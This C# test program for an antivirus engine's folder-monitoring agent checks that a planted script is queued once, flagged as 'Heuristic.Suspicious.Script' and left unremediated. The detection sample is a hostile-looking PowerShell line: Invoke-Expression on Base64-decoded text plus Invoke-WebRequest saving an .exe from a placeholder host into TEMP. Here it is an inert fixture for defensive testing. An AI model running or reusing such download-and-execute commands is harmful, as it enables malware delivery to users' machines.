using FFGuardian.Engine10;

internal static class Program
{
    private static async Task<int> Main()
    {
        string root = Path.Combine(Path.GetTempPath(), "FFGuardian-Agent-" + Guid.NewGuid().ToString("N"));
        string monitored = Path.Combine(root, "Monitored");
        Directory.CreateDirectory(monitored);

        try
        {
            string ignored = Path.Combine(monitored, "readme.txt");
            await File.WriteAllTextAsync(ignored, "harmless text");

            string suspicious = Path.Combine(monitored, "payload.ps1");
            await File.WriteAllTextAsync(
                suspicious,
                "Invoke-Expression ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QQ=='))); " +
                "Invoke-WebRequest 'https://example.invalid/file' -OutFile $env:TEMP+'\\x.exe'");

            using FFGuardianEngine10 engine = new(
                Path.Combine(root, "signatures.json"),
                updaterPublicKeyPem: null,
                Path.Combine(root, "Quarantine"),
                Path.Combine(root, "Rollback"));

            ProtectionAgentOptions10 options = new(
                new[] { monitored },
                TimeSpan.FromSeconds(5),
                TimeSpan.FromMilliseconds(100),
                32,
                IncludeSubdirectories: true);

            await using AutonomousProtectionAgent10 agent = new(engine, options);
            TaskCompletionSource<ProtectionAgentEvent10> scanned = new(TaskCreationOptions.RunContinuationsAsynchronously);
            int scannedEvents = 0;
            agent.Activity += (_, e) =>
            {
                if (e.EventType == "Scanned" && e.Path.EndsWith("payload.ps1", StringComparison.OrdinalIgnoreCase))
                {
                    Interlocked.Increment(ref scannedEvents);
                    scanned.TrySetResult(e);
                }
            };

            agent.Start();
            Ensure(agent.IsRunning, "L'agente non risulta avviato.");
            Ensure(agent.MonitoredFolderCount == 1, "La cartella di test non è monitorata.");
            Ensure(!agent.QueueFileForTest(ignored), "Un'estensione non monitorata è stata accodata.");

            bool firstQueued = agent.QueueFileForTest(suspicious);
            bool duplicateQueued = agent.QueueFileForTest(suspicious);
            Ensure(firstQueued, "Il file monitorato non è stato accodato.");
            Ensure(!duplicateQueued, "La deduplicazione degli eventi non ha funzionato.");

            ProtectionAgentEvent10 result = await scanned.Task.WaitAsync(TimeSpan.FromSeconds(15));
            Ensure(result.ScanResult is not null, "Risultato scansione automatica mancante.");
            Ensure(result.ScanResult.Verdict == ThreatVerdict10.Suspicious,
                $"Lo script doveva risultare sospetto, ottenuto: {result.ScanResult.Verdict}.");
            Ensure(result.ScanResult.DetectionName == "Heuristic.Suspicious.Script",
                "Classificazione automatica dello script non corretta.");
            Ensure(scannedEvents == 1, "Il file è stato scansionato più volte nello stesso intervallo di deduplicazione.");
            Ensure(File.Exists(suspicious), "L'agente non deve applicare remediation automatica.");

            await agent.StopAsync();
            Ensure(!agent.IsRunning, "L'agente non si è arrestato correttamente.");

            Console.WriteLine("FFGuardian.Engine10 agent tests: PASSED");
            return 0;
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine("FFGuardian.Engine10 agent tests: FAILED");
            Console.Error.WriteLine(ex);
            return 1;
        }
        finally
        {
            try
            {
                if (Directory.Exists(root))
                    Directory.Delete(root, recursive: true);
            }
            catch
            {
            }
        }
    }

    private static void Ensure(bool condition, string message)
    {
        if (!condition)
            throw new InvalidOperationException(message);
    }
}
